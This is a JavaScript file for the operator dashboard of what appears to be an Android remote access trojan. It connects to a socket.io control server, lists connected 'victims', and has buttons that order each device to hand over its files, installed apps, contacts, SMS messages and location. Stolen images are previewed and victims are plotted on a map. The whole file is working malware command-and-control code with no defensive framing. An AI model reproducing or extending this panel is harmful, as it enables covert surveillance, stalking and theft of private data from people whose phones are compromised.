const socket = io();
socket.emit('adminJoin');

const map = L.map('map').setView([0, 0], 2);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ maxZoom: 19 }).addTo(map);

let victimMarkers = {};

socket.on('join', device => {
    showNotification(`Device connected: ${device.model} (${device.id})`);

    const div = document.createElement('div');
    div.className = 'device';
    div.id = 'device-' + device.id;
    div.innerHTML = `
        <h3>${device.model} (${device.id})</h3>
        <button onclick="getDir('${device.id}')">Files</button>
        <button onclick="getApps('${device.id}')">Apps</button>
        <button onclick="getContacts('${device.id}')">Contacts</button>
        <button onclick="getSMS('${device.id}')">SMS</button>
        <button onclick="getLocation('${device.id}')">Location</button>
        <div class="downloads"></div>
        <div class="images"></div>
    `;
    document.getElementById('victims').appendChild(div);
});

socket.on('disconnectClient', id => {
    showNotification(`Device disconnected: ${id}`);
    const el = document.getElementById('device-' + id);
    if(el) el.remove();
    if(victimMarkers[id]){
        map.removeLayer(victimMarkers[id]);
        delete victimMarkers[id];
    }
});

socket.on('download', data => {
    const div = document.querySelector(`#device-${data.id} .downloads`);
    if(div) div.innerHTML = `Downloading ${data.fileName}: ${data.progress}%`;
});

socket.on('previewImage', fileData => {
    const div = document.querySelector(`#device-${fileData.id} .images`);
    if(div){
        const img = document.createElement('img');
        img.src = `data:image/png;base64,${fileData.data}`;
        div.appendChild(img);
    }
});

socket.on('getLocation', loc => {
    const { id, latitude, longitude } = loc;
    if(victimMarkers[id]){
        victimMarkers[id].setLatLng([latitude, longitude]);
    } else {
        const marker = L.marker([latitude, longitude]).addTo(map);
        marker.bindPopup(`${id}`);
        victimMarkers[id] = marker;
    }
});

function sendRequest(to, action){
    socket.emit('request', JSON.stringify({to, action, data: {}}));
}
function getDir(id){ sendRequest(id, 'getDir'); }
function getApps(id){ sendRequest(id, 'getInstalledApps'); }
function getContacts(id){ sendRequest(id, 'getContacts'); }
function getSMS(id){ sendRequest(id, 'getSMS'); }
function getLocation(id){ sendRequest(id, 'getLocation'); }

function showNotification(msg){
    const n = document.createElement('div');
    n.className = 'notification';
    n.innerText = msg;
    document.getElementById('notifications').appendChild(n);
    setTimeout(()=>n.remove(),5000);
}